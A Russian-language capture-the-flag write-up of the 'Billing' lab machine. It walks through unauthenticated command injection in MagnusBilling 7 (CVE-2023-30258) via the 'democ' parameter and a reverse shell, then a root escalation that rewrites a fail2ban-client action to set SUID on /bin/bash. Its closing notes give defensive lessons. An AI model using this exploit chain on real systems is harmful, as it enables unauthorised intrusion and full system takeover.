# Billing

**Сложность:** Easy
**Техники:** неаутентифицированный RCE в MagnusBilling (CVE-2023-30258) · privesc через `fail2ban-client`

## Разведка
```bash
nmap -sC -sV -Pn -oN portscan.nmap <ip>
```
```
22/tcp   open  ssh     OpenSSH 9.2p1 (Debian)
80/tcp   open  http    Apache 2.4.62  → /mbilling/ (MagnusBilling)
3306/tcp open  mysql   MariaDB
```
`robots.txt` запрещает `/mbilling/`; README подтверждает **MagnusBilling 7**.

## Эксплуатация — CVE-2023-30258 (command injection)
```bash
searchsploit magnusbilling 7     # multiple/webapps/52170.txt
```
Неаутентифицированная инъекция команд в `lib/icepay/icepay.php` через параметр `democ`. Проверка слепым таймингом:
```bash
time curl "http://<ip>/mbilling/lib/icepay/icepay.php?democ=;sleep+5;"
# real 5.06s → команда выполняется
```
Превратил в reverse shell на листенер `nc -lvnp 4444` → шелл под `asterisk`.

## Повышение привилегий — fail2ban-client
```bash
sudo -l
#   (ALL) NOPASSWD: /usr/bin/fail2ban-client
```
fail2ban запускает action-команду при бане IP. Переопределяем action на свою команду (от root), затем триггерим бан:
```bash
sudo fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK \
    actionban 'chmod +s /bin/bash'
sudo fail2ban-client set asterisk-iptables banip 1.2.3.4   # триггерит action
/bin/bash -p                                               # SUID bash → root
```
```
# id → uid=0(root)
/root/root.txt → THM{REDACTED}
/home/magnus/user.txt → THM{REDACTED}
```

## Выводы
- Патчить сторонние веб-приложения — unauth RCE не требует учёток.
- `NOPASSWD` на `fail2ban-client` = root: его action-команды выполняются от root и полностью контролируются атакующим.
- Трюк SUID-bash (`chmod +s /bin/bash` → `bash -p`) — классический примитив закрепления root. Мониторить новые SUID-бинарники (точка детекта для honeynet/SIEM).
